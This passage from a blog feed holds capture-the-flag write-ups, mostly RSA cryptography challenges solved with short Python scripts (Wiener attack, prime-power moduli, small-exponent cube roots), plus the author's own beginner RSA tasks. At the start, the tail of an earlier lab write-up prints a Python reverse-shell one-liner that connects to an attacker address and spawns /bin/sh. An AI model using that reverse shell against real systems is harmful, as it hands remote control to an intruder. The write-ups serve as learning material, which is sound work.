class="hljs-built_in">socket</span>.AF_INET,<span class="hljs-built_in">socket</span>.SOCK_STREAM);s.connect((&lt;IP&gt;,<span class="hljs-number">1234</span>));os.dup2(s.fileno(),<span class="hljs-number">0</span>); os.dup2(s.fileno(),<span class="hljs-number">1</span>); os.dup2(s.fileno(),<span class="hljs-number">2</span>);p=subprocess.call([“/bin/sh”,”-i”]);’<br></code></pre></td></tr></table></figure><p>We can edit the file using nano, dont forget to set up a listener and change your ip address in the reverseshell.<br><img src="/img/fs/image17.png" alt="image"><br>And that’s itt!!</p><p>No answer needed</p><p>Thanks for reading ❤ feel free to leave any feedback so I can improve my articles, cya next time!</p>]]></content>
    
    
    
    <tags>
      
      <tag>thm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CyberSpark CTF— RSA writeups</title>
    <link href="/2024/12/28/CyberSpark-CTF%E2%80%94-RSA-writeups/"/>
    <url>/2024/12/28/CyberSpark-CTF%E2%80%94-RSA-writeups/</url>
    
    <content type="html"><![CDATA[<p>This was a very friendly ctf , and here are some of the crypto tasks that I solved</p><p><em><strong>BIGRSA -495pts-</strong></em><br><img src="/img/spark/img1.png" alt="image"><br>task file :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs flag"><br>p = getPrime(512)<br>q = getPrime(512)<br>n = p*q<br>phi = (p-1)*(q-1)<br><br>e = 65537<br>e1 = pow(e,e)<br>e2 = pow(e,e1)<br><br>c = pow(bytes_to_long(flag), e2, n)<br><br>print(f&quot;n = &#123;n&#125;&quot;)<br>print(f&quot;c = &#123;c&#125;&quot;)<br>print(f&quot;phi = &#123;phi&#125;&quot;)<br></code></pre></td></tr></table></figure><p>So given n, c and phi we still need to calculate the private key d , the trick here is that the public exponent is loo large to be computed as it is, but what we do know that e&#x3D;d^-1 mod phi, so obv it can’t be larger than phi.<br>And for our computers to calculate properly we have to calculate the main public exponent in one pow() function like so:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs e">e2 = pow(e,pow(e,e),phi)<br>d=pow(e2,-1,phi)<br></code></pre></td></tr></table></figure><p>full solver :</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus">from Crypto<span class="hljs-selector-class">.Util</span><span class="hljs-selector-class">.number</span> import long_to_bytes<br><br>n = <span class="hljs-number">55339911839568605434033119987234278623062104594980067237791202130538703553598242587186156138509099454400445619635644594061470675797718659928407400269551978058243845422309215484245910720668443757162324020828699580386175041359988444335094233126606419429252632754027267957490682824524591446083809482067641933921</span><br>c = <span class="hljs-number">28394648362572195405154050926901886104871039494850568080337805873579271922974681293349820441677917300181035352920902658615721186023552174517928833214102936527195030009209318356079439857753022042964213177166879477425682131551361877531408060772055765524824337125480439496758501935767584364707361966390976763090</span><br>phi = <span class="hljs-number">55339911839568605434033119987234278623062104594980067237791202130538703553598242587186156138509099454400445619635644594061470675797718659928407400269551963179351785922840972886056626020934304203063841142648828205963538281527472772041765227434937080954519833137577263904112829279761219086708895910252445976772</span><br>e = <span class="hljs-number">65537</span><br>e2 = <span class="hljs-built_in">pow</span>(e,<span class="hljs-built_in">pow</span>(e,e),phi)<br>d=<span class="hljs-built_in">pow</span>(e2,-<span class="hljs-number">1</span>,phi)<br>m=<span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(long_to_bytes(m)</span></span><span class="hljs-selector-class">.decode</span>())<br></code></pre></td></tr></table></figure><blockquote><p>flag : Spark{RSA_Genius?!!!}</p></blockquote><p><em><strong>Kinda easy RSA -436pts-</strong></em></p><p><img src="/img/spark/img2.webp" alt="image"></p><p>Data :</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">N</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x9857550a7d4fad45a2a1b354bfd33c2d5912749e7f396ab36f891b7506db41e61f70a216e6421315987f8cc0b5bf6d5f81785aa908690ea3c2671001dc23eb0bca59afaee798ab4e7feda4df474f372e9927bd5d7b855af3a209908d2baad72b8c5c7fde465d155844cffd38585ad9aeb7e430561992ff543d55d3839901c0d713cce88e8880700428261e10e1cd90f5694a6ef16a3a1f61aa73f1666b60e4e83ab605c11234e429090e4ae4c5f0c761115710305648fe5890d88e0e50ff73993fce9165005c7d07e9d7446b1fa6b28acc55047f5b403f5318aa7b21bc1cd6a668d4455a473861e8f693518d1fbf36dfb2e2466c4cc194a6cded7d173f4ad073<br><span class="hljs-attribute">e</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x693ff9dd4a34f6a3cc80403f777882e73716db11684dea651be2e31c71ff480cdc30e0e6a14b74aef85f1afb4fe20d953806ca7c588818d94b47a16441d512c6ba1f922b3569d799fc98fa641a244f4960eeac517f993152a6da7ca3b9226466437e5bd1e94d56b6ce7216f09719b76cef341e5b0da9f6b35cc171404e575d6811a4bd90f8b250f75ec7411c6f7576f2fc9a4060554330abc307540e15cdea3b7416f185dee4b7359cee7d970059357d47c2718987804f41fd8507646fd510a1a2ef3e1adf7e7bdd7ed8a2a923dee116d6a20d589a716b8ad7cd2bd3171c6e2f0448e09b02fbdc3e25957b8d84805b95ba131468e6774baa1e0b7522f05d42d3<br><span class="hljs-attribute">c</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>xb1cb17d7e9dd7b4f9c31392201d0da9586fccc6b033f918e2defe36082fb7c4d205614f3e7fc1eed03a950b04a74a958198e19f91f377c1bdce8f01e0dcc1d120e4d9f7ef9c7e329ca87a26364ee58a019ce4f42836e8ebe86fe05e1704de8f016c5322fd991bda5975e10828f531fa0ce0520a9c4539cf4626c6a19326d9d7bcbb179deb6f8c10f74a7e21fa0c1f044c9fc6144f3e46e3bda23f0385bf24e460ad43c5f7d14976ab75f98b1091c48d072c1129db50232d562e0e82b6373cceeb3a7eb895a87d120a1c2c5bd71420a77d0c86b2ac7364ee1e3702ea784409cf820008544dba21b1f967d6fda1ca3fc1885e7f24852d837b698ed17ad8db2888<br></code></pre></td></tr></table></figure><p>Looking at how big those integers are, the first thing I thought of is the wiener attack, easy .<br>solver :</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import owiener<br>from Crypto<span class="hljs-selector-class">.Util</span><span class="hljs-selector-class">.number</span> import long_to_bytes<br><br>N = <span class="hljs-number">0</span>x9857550a7d4fad45a2a1b354bfd33c2d5912749e7f396ab36f891b7506db41e61f70a216e6421315987f8cc0b5bf6d5f81785aa908690ea3c2671001dc23eb0bca59afaee798ab4e7feda4df474f372e9927bd5d7b855af3a209908d2baad72b8c5c7fde465d155844cffd38585ad9aeb7e430561992ff543d55d3839901c0d713cce88e8880700428261e10e1cd90f5694a6ef16a3a1f61aa73f1666b60e4e83ab605c11234e429090e4ae4c5f0c761115710305648fe5890d88e0e50ff73993fce9165005c7d07e9d7446b1fa6b28acc55047f5b403f5318aa7b21bc1cd6a668d4455a473861e8f693518d1fbf36dfb2e2466c4cc194a6cded7d173f4ad073<br>e = <span class="hljs-number">0</span>x693ff9dd4a34f6a3cc80403f777882e73716db11684dea651be2e31c71ff480cdc30e0e6a14b74aef85f1afb4fe20d953806ca7c588818d94b47a16441d512c6ba1f922b3569d799fc98fa641a244f4960eeac517f993152a6da7ca3b9226466437e5bd1e94d56b6ce7216f09719b76cef341e5b0da9f6b35cc171404e575d6811a4bd90f8b250f75ec7411c6f7576f2fc9a4060554330abc307540e15cdea3b7416f185dee4b7359cee7d970059357d47c2718987804f41fd8507646fd510a1a2ef3e1adf7e7bdd7ed8a2a923dee116d6a20d589a716b8ad7cd2bd3171c6e2f0448e09b02fbdc3e25957b8d84805b95ba131468e6774baa1e0b7522f05d42d3<br>c = <span class="hljs-number">0</span>xb1cb17d7e9dd7b4f9c31392201d0da9586fccc6b033f918e2defe36082fb7c4d205614f3e7fc1eed03a950b04a74a958198e19f91f377c1bdce8f01e0dcc1d120e4d9f7ef9c7e329ca87a26364ee58a019ce4f42836e8ebe86fe05e1704de8f016c5322fd991bda5975e10828f531fa0ce0520a9c4539cf4626c6a19326d9d7bcbb179deb6f8c10f74a7e21fa0c1f044c9fc6144f3e46e3bda23f0385bf24e460ad43c5f7d14976ab75f98b1091c48d072c1129db50232d562e0e82b6373cceeb3a7eb895a87d120a1c2c5bd71420a77d0c86b2ac7364ee1e3702ea784409cf820008544dba21b1f967d6fda1ca3fc1885e7f24852d837b698ed17ad8db2888<br><br>d = owiener<span class="hljs-selector-class">.attack</span>(e, N)<br><span class="hljs-keyword">if</span> d:<br>    m = <span class="hljs-built_in">pow</span>(c, d, N)<br>    flag = <span class="hljs-built_in">long_to_bytes</span>(m)<br><br>    <span class="hljs-built_in">print</span>(flag)<br><span class="hljs-keyword">else</span>:<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;attack failed&#x27;</span>)<br></code></pre></td></tr></table></figure><blockquote><p>flag &#x3D; Spark{ab4b5f8a879411e556590886f28090fa990aaa0f}</p></blockquote><p><em><strong>RSA101 -449pts-</strong></em><br><img src="/img/spark/img3.webp" alt="image"></p><p>task file :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>).read()<br>flag = bytes_to_long(flag)<br>e = <span class="hljs-number">65537</span><br>p = getPrime(<span class="hljs-number">512</span>)<br>n = p*p*p<br>c = <span class="hljs-built_in">pow</span>(flag, e, n)<br><br><span class="hljs-built_in">print</span> (<span class="hljs-string">f&quot;n = <span class="hljs-subst">&#123;n&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span> (<span class="hljs-string">f&quot;c = <span class="hljs-subst">&#123;c&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>So the modulus n here is p³, therefore  the Euler’s totient function phi for a prime power argument is :<br><img src="/img/spark/eu.png" alt="image"></p><p>in our case a&#x3D;3 so phi(n)&#x3D;phi(p*<em>3)&#x3D;p²</em>(p-1).<br>Solver :</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> gmpy2 import iroot<br><span class="hljs-keyword">from</span> Crypto.Util.number import long_to_bytes<br><br>n = 880674765938292988253202733068999441370225980493082250293770108839238525173140672028586926059569234956086334098934256319958427223211981609900174353433233635531420938608337844907638761397741872915869057101536297717494270382023262734939463053245168089144322878569577839083545388805481696553406917669778617558497888334679076374709271281550795111553114600031758193437040624986352761831630272858688309123381388470862086985921176162048792009987228215795441625521616137<br>c = 645056485211620346978535666785604975280754872647179594109641305091423921165155722104664444088687235839128248600148143315460009492054409130436797788265699866177932125389944332649532462834332178279205964361079082767369331533906053438874273146377191231020779328010810371540314926752311621146795928267762979331803528053448822028978261770189358788240873445590240544604410075899620636633697878839846303267286114971103304095344337085090641058311308066880525320223837207<br><span class="hljs-attribute">p</span>=iroot(n,3)[0]<br>e = 65537<br><br>phi = p*<span class="hljs-number">*2</span>*(p-1)<br><span class="hljs-attribute">d</span>=pow(e,-1,phi)<br><span class="hljs-attribute">m</span>=pow(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m).decode())<br></code></pre></td></tr></table></figure><blockquote><p>flag &#x3D; Spark{N0t_Y0Ur_R3GUL4R_T0Ti3Nt}</p></blockquote><p><em><strong>SUDO -500pts-</strong></em></p><p><img src="/img/spark/img5.png" alt="image"></p><p>I was surprised this task had only 2 solves, would’ve been so easy if u just knew how rsa works.<br>so the cipher text istelf is equal to m^e mod n.<br>If the e is too small ,like 3 in our case, we can take the e’th root of c , or if m^e &gt; N, we can keep adding the modulus n until we get to the correct value of m which is the cube.root(c+k*n)<br>for this chall I did brute force it in a range of 20 and I got the flag .<br>solver :</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stylus">from Crypto<span class="hljs-selector-class">.Util</span><span class="hljs-selector-class">.number</span> import  long_to_bytes<br>from gmpy2 import iroot<br><br>c = <span class="hljs-number">21219812398146774982012671975172698983037477798626924660438494599504149529737723511870861195181900330890516887624967642878410986845215343561744768345349889381245089393834161962270484578831648076878935348353324755624</span><br>n = <span class="hljs-number">21219812398146774982012671975172698983037477798626924660438494599504149529737723511870861195181900330890516887624967642878410994945215343561744849345324532423485089393834161962468778767831648076897857676678645723678</span><br>e=<span class="hljs-number">3</span><br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br><br>    m = <span class="hljs-built_in">iroot</span>(c+(i*n), e)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">long_to_bytes</span>(m<span class="hljs-selector-attr">[0]</span>))<br></code></pre></td></tr></table></figure><p>output :</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs rust">←*snip* →<br><span class="hljs-string">b&#x27;L<span class="hljs-char escape_">\x</span>bb<span class="hljs-char escape_">\x</span>e3<span class="hljs-char escape_">\x</span>e4<span class="hljs-char escape_">\x</span>1a.M<span class="hljs-char escape_">\n</span>~,<span class="hljs-char escape_">\x</span>91<span class="hljs-char escape_">\x</span>d8<span class="hljs-char escape_">\x</span>10<span class="hljs-char escape_">\x</span>17&amp;<span class="hljs-char escape_">\x</span>e8Y<span class="hljs-char escape_">\x</span>9d<span class="hljs-char escape_">\x</span>80N<span class="hljs-char escape_">\x</span>e5<span class="hljs-char escape_">\x</span>b4<span class="hljs-char escape_">\x</span>d8<span class="hljs-char escape_">\x</span>db<span class="hljs-char escape_">\x</span>b4<span class="hljs-char escape_">\x</span>eeAW$<span class="hljs-char escape_">\x</span>db&#x27;</span><br><span class="hljs-string">b&#x27;P9<span class="hljs-char escape_">\x</span>ff<span class="hljs-char escape_">\x</span>f8<span class="hljs-char escape_">\x</span>03+<span class="hljs-char escape_">\x</span>dc<span class="hljs-char escape_">\x</span>b9<span class="hljs-char escape_">\x</span>ad%<span class="hljs-char escape_">\x</span>c3<span class="hljs-char escape_">\x</span>8ep<span class="hljs-char escape_">\x</span>a4&#123;<span class="hljs-char escape_">\x</span>e0<span class="hljs-char escape_">\x</span>af<span class="hljs-char escape_">\x</span>92|<span class="hljs-char escape_">\x</span>03<span class="hljs-char escape_">\x</span>a0b<span class="hljs-char escape_">\x</span>10<span class="hljs-char escape_">\x</span>85<span class="hljs-char escape_">\x</span>eb9X<span class="hljs-char escape_">\x</span>af<span class="hljs-char escape_">\x</span>ae<span class="hljs-char escape_">\x</span>a5&#x27;</span><br><span class="hljs-string">b&#x27;Spark&#123;L00piN6_4R0uND_M0DuLU5&#125;<span class="hljs-char escape_">\t</span>&#x27;</span><br><span class="hljs-string">b&#x27;Vk<span class="hljs-char escape_">\x</span>e3<span class="hljs-char escape_">\x</span>c3k<span class="hljs-char escape_">\x</span>e4<span class="hljs-char escape_">\x</span>8d<span class="hljs-char escape_">\x</span>c9g<span class="hljs-char escape_">\x</span>a0<span class="hljs-char escape_">\x</span>fe<span class="hljs-char escape_">\x</span>ce<span class="hljs-char escape_">\x</span>1f<span class="hljs-char escape_">\x</span>8c&amp;b<span class="hljs-char escape_">\x</span>99&quot;<span class="hljs-char escape_">\x</span>d4<span class="hljs-char escape_">\x</span>8c1<span class="hljs-char escape_">\x</span>02V<span class="hljs-char escape_">\x</span>d6<span class="hljs-char escape_">\x</span>f2<span class="hljs-char escape_">\x</span>cdv7<span class="hljs-char escape_">\x</span>8d<span class="hljs-char escape_">\&#x27;</span>&#x27;</span><br>←*snip* →<br></code></pre></td></tr></table></figure><blockquote><p>flag &#x3D; Spark{L00piN6_4R0uND_M0DuLU5}</p></blockquote><p>That’s it for now :&#x3D;)<br>There were other fun tasks that I enjoyed solving but I’ll probably focus on crypto writeups ftm.<br>Thanks for reading and dont forget to leave a feedback !<br>cya! :D</p>]]></content>
    
    
    
    <tags>
      
      <tag>RSA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Easy RSA CTFs</title>
    <link href="/2024/12/28/Easy-RSA-CTFs/"/>
    <url>/2024/12/28/Easy-RSA-CTFs/</url>
    
    <content type="html"><![CDATA[<p>Below is a collection of the basic &#x2F; easy rsa challenges that I authored for the guided CTF hosted by Securinets ISI.</p><p><strong>RSA01</strong></p><p>description :  RSA is a public-key cryptography algorithm that encrypts and decrypts data securely using a pair of keys: a public key for encryption and a private key for decryption. Attacking RSA in a CTF often involves exploiting weak key generation, small encryption exponents, or insufficient padding to factorize the modulus or recover plaintext. Can you break my encryption and retrieve the flag?</p><p>Data :<br><code>n = 133057759405410196713996577614776585137 c = 81027466694039655654338302697352619188  e = 65537`</code><br>For this challenge the modulus n is too small that it’s easy to factorise it using factordb and retrieve p&amp;q then calculate the private key d to finally recover the flag.</p><p>Solver : </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> Crypto.Util.number import long_to_bytes, inverse<br><br><br>n = 133057759405410196713996577614776585137<br>c = 81027466694039655654338302697352619188 <br><span class="hljs-attribute">e</span>=65537<br>p,<span class="hljs-attribute">q</span>=9408799956350366153 , 14141841682541493929<br><br><br>r=(p-1)*(q-1)<br><span class="hljs-attribute">d</span>=inverse(e,r)<br><br><span class="hljs-attribute">m</span>=pow(c,d,n)<br><span class="hljs-attribute">f</span>=long_to_bytes(m).decode(&#x27;utf-8&#x27;)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Securinets&#123;&quot;</span> + f +<span class="hljs-string">&quot;&#125;&quot;</span>)<br></code></pre></td></tr></table></figure><p><strong>RSA02</strong><br>description :  if I use one prime only for N , you wont be able to factorise it ! im so smartttt </p><p>Data :</p><p><code>c = 118282453994915067115533072330204791590985623652958941724778500771132309209861471374977196484899695310790041029397945228312122466853334812707185314591133611995735076734093397710259825632388059828239146185365391425927762196807431151021766050491656240686821887089991313147120177642109805744451402690972638232208 e = 65537 n = 146943159688355173703916100543422379050357054115445990235972218469195431271709113288070841431038332725248398306543010191587575795114347455545117361096054023707807481731708102069920173598906378778376470955147300891620899721367733561338236185018799014766984757756587631920968288449973827629341343486711607539921</code></p><p>because the decription itself is a hint, we can guess that N is a prime itself instead of a product of 2 primes , as if N&#x3D;p<br>Therefore the euler tuition is simply phi&#x3D;N-1</p><p>Solver :</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> Crypto.Util.number import bytes_to_long, inverse, getPrime, long_to_bytes<br><br>c = 118282453994915067115533072330204791590985623652958941724778500771132309209861471374977196484899695310790041029397945228312122466853334812707185314591133611995735076734093397710259825632388059828239146185365391425927762196807431151021766050491656240686821887089991313147120177642109805744451402690972638232208<br>e = 65537<br>n = 146943159688355173703916100543422379050357054115445990235972218469195431271709113288070841431038332725248398306543010191587575795114347455545117361096054023707807481731708102069920173598906378778376470955147300891620899721367733561338236185018799014766984757756587631920968288449973827629341343486711607539921<br><br><span class="hljs-attribute">phi</span>=n-1<br><span class="hljs-attribute">d</span>=inverse(e,phi)<br><span class="hljs-built_in">print</span>(long_to_bytes(pow(c,d,n)))<br></code></pre></td></tr></table></figure><p><strong>RSA03</strong><br>description : A 1024bit prime wasnt enough , and the 2048bit takes too long to generate , so I generated one and used it 4 times hehe. my number is real huge rn ;)</p><p>Data :</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">c</span><span class="hljs-operator">=</span><span class="hljs-number">19134745275853194244503274030795421762751522415696767603261669936071405459005384769933434710016779543250956707812515094242574018194676257513764291640739637309694951402828389416196073330414030135316532127299164661461474466434106368166999042073035142601932114669993593582411556895863088075301414562257356600771140910874483259543923293638309986862599629911582061638816509857936693518316412641347185821933608716580148400006401584742030822994147694241279316996591456664764737966681902295961926719060406235766606530307906506074485147282109688652355764806745553846746779646486597458061805223119273617165510995444554998268468874307672361703832102277193553679673692510833348067984482250484583338427925466915171553404439378058589942892381199700348848022611900428310003322115381408422036941535865665887921366450355836640142336602494339843279385799585879384270232349283820447079412271069818218270110241826564255120098584111318288430261753943145918587034365416019965883765680504984000188761691359835653829745238783563320399591988226758980384470312668504399659973823873261718201972875706351891914040829153312712321376733222848656886532703469789894802853336793333587780004201380642692503186996380817503106542224474497677602589165653715186120472831653772899406800617990546004685231074474016455622030766175230542323511603645779349776320687647782989555722351567812720275957035955713690580718363542019151662368656349235353024384408586125497942783549553366432135316578559767620628474591570042765570502787364092210441075517313747151023052828908012962493966179623817478013636123056309724947968928001628469554672746997334694399453407073352436232841177718541650831215548465194385987720273170127921998145033469088644718754568068589999917296585075509866617086721328472864032016169372044916913568308581975830533258753677823378594543675756192508593533071127225858748419752355485678532217980337921689114893700448665412605161836395286763278088419297135767885275429085504661521633338134682593982675900569599430604042620687759836512684341682214118449025211639283776711115058149520971897921057079853857180649140825993343170303404545002448497759417414073836846420361307212351060369454934412990805030668440777112010054084050937719775132115870996431439278724822483664871764668734189553831000276582043520582966990862068736337014548798536326291199778030654958378054562753153183372668976075876664527759936152033089946958596486758352916448970690711702660954951507225274987257069677595630433666360937263088</span><br><span class="hljs-attribute">e</span> <span class="hljs-operator">=</span> <span class="hljs-number">65537</span><br><span class="hljs-attribute">n</span> <span class="hljs-operator">=</span> <span class="hljs-number">306607703391320056991513508753308666153844616701220871565567756535824442282020363654415017648287251418094948471550721510037817600354749031881292195025406884692963700853082836342568071081951327706971115819281677838267390893991115539454288086702195434281355343619618384963825082359923650376320707789535190216598886030782420201576372735472846975776891369441574236016694997945723166091024648343784719987678665417742217723228683101937082381061495252534905641610948072185757521700996820771253130256458431942937333222650601683491131174738247428266245587715749268238567846848723750778583206864060883545651183065329378774513614421500810990646535914591292953834490895542003777329054349717336728425248606309121611741566970489617677135004159364622510578671731155482755204795488150582666826594815791827689938675588977014320493667724140798567593974467195612351641352821702608556208775886482402907121023951693671323224679951727350959171944188688071550863511898397630553811189832564079579629859889126727205984841758587102825319022596325639974797827574130433192129922592125010908650175541115118252562154312855169609325513287696798639123259558384419082401559053867350286614651244167035643395835740987173693898941458094990621921731496148857527612123684720960000136425151047602273023138303135724647435930867481448233415635808109081172409980120573832791835162285828159598816252756809472054818599964619598004591754297393230007485296961651219928823707247431240313353642276735463786408483029377933033483173144720685398779473515484401913186710254190339831086747555652846170407711005445543290791822618993177939691776427979912746356355961781647172838349637813974986583013385191267088443242447648749480582697865171526854170867597938964948870978085979341683359085281848837171075345862242407732720429704596398726720581518807680912958669346224310775018193087642493531223643966222760512022136216924920976230463472478535799051380627345641642961713950476476243597167257713788697626216765556628995341269402205739928534509840720613601576820130781078109813406005673934688266607419655030801551599161922821939673577854460859643758941300319382438968910009093849410629473541672099732013280418462853503735213490678742707026205836833420926495325213943579367574987100085697983198275030082560049690384976104792045980946826660325555300100458514124012186157762882147441224700639367534144490333422997269694354445625952469391662795976652735323290855263245162753910469341528457898090564341771082201316338022681886321</span><br></code></pre></td></tr></table></figure><p>‘I generated one and used it 4 times’ , which indicated that N&#x3D;pppp &#x3D; p^4.<br>In this case we can find the prime factor p by simply calculating the 4th root of N , then we will calculate the euler tuition.</p><p>Solver :</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> Crypto.Util.number import bytes_to_long, inverse, getPrime, long_to_bytes<br><span class="hljs-keyword">from</span> gmpy2 import iroot<br><br><br><br>c = 19134745275853194244503274030795421762751522415696767603261669936071405459005384769933434710016779543250956707812515094242574018194676257513764291640739637309694951402828389416196073330414030135316532127299164661461474466434106368166999042073035142601932114669993593582411556895863088075301414562257356600771140910874483259543923293638309986862599629911582061638816509857936693518316412641347185821933608716580148400006401584742030822994147694241279316996591456664764737966681902295961926719060406235766606530307906506074485147282109688652355764806745553846746779646486597458061805223119273617165510995444554998268468874307672361703832102277193553679673692510833348067984482250484583338427925466915171553404439378058589942892381199700348848022611900428310003322115381408422036941535865665887921366450355836640142336602494339843279385799585879384270232349283820447079412271069818218270110241826564255120098584111318288430261753943145918587034365416019965883765680504984000188761691359835653829745238783563320399591988226758980384470312668504399659973823873261718201972875706351891914040829153312712321376733222848656886532703469789894802853336793333587780004201380642692503186996380817503106542224474497677602589165653715186120472831653772899406800617990546004685231074474016455622030766175230542323511603645779349776320687647782989555722351567812720275957035955713690580718363542019151662368656349235353024384408586125497942783549553366432135316578559767620628474591570042765570502787364092210441075517313747151023052828908012962493966179623817478013636123056309724947968928001628469554672746997334694399453407073352436232841177718541650831215548465194385987720273170127921998145033469088644718754568068589999917296585075509866617086721328472864032016169372044916913568308581975830533258753677823378594543675756192508593533071127225858748419752355485678532217980337921689114893700448665412605161836395286763278088419297135767885275429085504661521633338134682593982675900569599430604042620687759836512684341682214118449025211639283776711115058149520971897921057079853857180649140825993343170303404545002448497759417414073836846420361307212351060369454934412990805030668440777112010054084050937719775132115870996431439278724822483664871764668734189553831000276582043520582966990862068736337014548798536326291199778030654958378054562753153183372668976075876664527759936152033089946958596486758352916448970690711702660954951507225274987257069677595630433666360937263088<br>e = 65537<br>n = 30660770339132005699151350875330866615384461670122087156556775653582444228202036365441501764828725141809494847155072151003781760035474903188129219502540688469296370085308283634256807108195132770697111581928167783826739089399111553945428808670219543428135534361961838496382508235992365037632070778953519021659888603078242020157637273547284697577689136944157423601669499794572316609102464834378471998767866541774221772322868310193708238106149525253490564161094807218575752170099682077125313025645843194293733322265060168349113117473824742826624558771574926823856784684872375077858320686406088354565118306532937877451361442150081099064653591459129295383449089554200377732905434971733672842524860630912161174156697048961767713500415936462251057867173115548275520479548815058266682659481579182768993867558897701432049366772414079856759397446719561235164135282170260855620877588648240290712102395169367132322467995172735095917194418868807155086351189839763055381118983256407957962985988912672720598484175858710282531902259632563997479782757413043319212992259212501090865017554111511825256215431285516960932551328769679863912325955838441908240155905386735028661465124416703564339583574098717369389894145809499062192173149614885752761212368472096000013642515104760227302313830313572464743593086748144823341563580810908117240998012057383279183516228582815959881625275680947205481859996461959800459175429739323000748529696165121992882370724743124031335364227673546378640848302937793303348317314472068539877947351548440191318671025419033983108674755565284617040771100544554329079182261899317793969177642797991274635635596178164717283834963781397498658301338519126708844324244764874948058269786517152685417086759793896494887097808597934168335908528184883717107534586224240773272042970459639872672058151880768091295866934622431077501819308764249353122364396622276051202213621692492097623046347247853579905138062734564164296171395047647624359716725771378869762621676555662899534126940220573992853450984072061360157682013078107810981340600567393468826660741965503080155159916192282193967357785446085964375894130031938243896891000909384941062947354167209973201328041846285350373521349067874